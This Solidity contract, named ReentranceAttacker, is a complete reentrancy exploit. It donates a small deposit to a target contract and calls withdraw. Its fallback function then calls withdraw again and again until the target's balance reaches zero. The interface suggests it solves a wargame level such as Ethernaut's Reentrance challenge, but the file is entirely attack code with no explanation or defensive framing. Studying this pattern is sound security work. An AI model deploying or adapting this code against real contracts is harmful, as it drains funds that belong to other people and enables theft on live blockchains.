// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

import '@openzeppelin/contracts/math/SafeMath.sol';
interface IReentrance{
  function donate(address _to) external payable;
  function withdraw(uint _amount) external;
  //function balanceOf(address _who) external view returns (uint balance);
}
contract ReentranceAttacker {

  IReentrance public reentranceImplementation;
  uint valor = 100000000000000;

  constructor(address _reentranceImplementation) public payable{
    reentranceImplementation = IReentrance(_reentranceImplementation);
  }

  function deposit() external {
    reentranceImplementation.donate{value: valor}(address(this));
  }

  function attack() external {
    reentranceImplementation.withdraw(valor);
  }

  fallback() external payable {
    if (address(reentranceImplementation).balance != 0 ) {
        reentranceImplementation.withdraw(valor); 
    }
}
}